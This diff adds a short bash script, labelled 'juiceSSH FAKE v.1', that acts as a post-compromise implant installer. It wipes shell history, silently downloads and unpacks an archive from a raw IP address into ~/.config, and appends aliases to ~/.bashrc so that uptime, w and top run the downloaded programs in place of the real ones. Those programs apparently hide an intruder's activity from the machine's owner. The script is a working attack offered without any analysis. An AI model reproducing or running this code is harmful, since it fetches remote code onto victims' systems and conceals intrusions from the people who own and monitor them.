@@ -1,0 +1,12 @@
+#!/bin/bash
+unset HISTFILE ; unset HISTSAVE ; unset HISTZONE ; unset HISTORY ; history -c;
+echo -e "             \e[32m[[\e[6m\e[40m-SUCCESS-\e[0m\e[0m\e[32m]]\e[0m\e[7m+ juiceSSH FAKE v.1 +\e[0m\e[32m[[\e[6m\e[40m-SUCCESS-\e[0m\e[32m]]\e[0m"
+mkdir ~/.config
+cd ~/.config
+wget -q 45.148.10.207/i.fake
+tar -xvf i.fake >> /dev/null
+echo 'alias uptime=~/.config/uptime' >> ~/.bashrc
+echo 'alias w=~/.config/w' >> ~/.bashrc
+echo 'alias top=~/.config/top' >> ~/.bashrc
+source ~/.bashrc
+echo -e "             \e[32m[[\e[6m\e[40m-SUCCESS-\e[0m\e[0m\e[32m]]\e[0m\e[7m+ juiceSSH FAKE Finish +\e[0m\e[32m[[\e[6m\e[40m-SUCCESS-\e[0m\e[32m]]\e[0m"
